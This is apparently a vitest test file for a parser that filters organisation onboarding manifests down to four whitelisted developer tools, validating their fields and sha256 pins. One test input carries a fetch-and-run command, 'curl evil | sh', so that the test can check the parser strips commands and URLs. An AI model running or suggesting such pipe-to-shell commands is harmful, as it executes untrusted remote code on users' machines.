import { describe, expect, it } from "vitest";

import { parseOrgOnboardingManifest } from "./org-onboarding";
import { TEST_ONBOARDING_MANIFEST } from "../../../../common/org-onboarding-test-manifest";
import { parseOrgOnboardingTools } from "./org-onboarding-tools";

describe("parseOrgOnboardingTools", () => {
  it("keeps only the four known tools and never carries commands or urls", () => {
    const tools = parseOrgOnboardingTools([
      { id: "gh", required: true, why: "Clone repos", command: "curl evil | sh", url: "https://x" },
      { id: "gh", required: false, why: "duplicate" },
      { id: "terraform", required: true, why: "unknown tool" },
      { id: "docker", required: "yes", why: "Run services" },
      { id: "coder", required: true, why: "" },
      "gcloud",
    ]);
    expect(tools).toEqual([
      { id: "gh", required: true, why: "Clone repos" },
      { id: "docker", required: false, why: "Run services" },
    ]);
  });

  it("returns nothing for a missing or malformed field", () => {
    expect(parseOrgOnboardingTools(undefined)).toEqual([]);
    expect(parseOrgOnboardingTools({ id: "gh" })).toEqual([]);
  });

  it("survives the manifest parser and is absent when the org names none", () => {
    const withTools = parseOrgOnboardingManifest({
      ...TEST_ONBOARDING_MANIFEST,
      tools: [{ id: "gcloud", required: true, why: "Sign in to Google Cloud" }],
    });
    expect(withTools?.tools).toEqual([
      { id: "gcloud", required: true, why: "Sign in to Google Cloud" },
    ]);
    expect(parseOrgOnboardingManifest(TEST_ONBOARDING_MANIFEST)?.tools).toBeUndefined();
  });

  it("keeps a well-formed coder sha256 pin per CPU and drops it for other tools or bad hashes", () => {
    const good = "a".repeat(64);
    const tools = parseOrgOnboardingTools([
      {
        id: "coder",
        required: false,
        why: "Cloud",
        sha256: { arm64: good.toUpperCase(), amd64: "xyz" },
      },
      { id: "gh", required: true, why: "Repos", sha256: { arm64: good } },
    ]);
    expect(tools).toEqual([
      { id: "coder", required: false, why: "Cloud", sha256: { arm64: good } },
      { id: "gh", required: true, why: "Repos" },
    ]);
  });
});
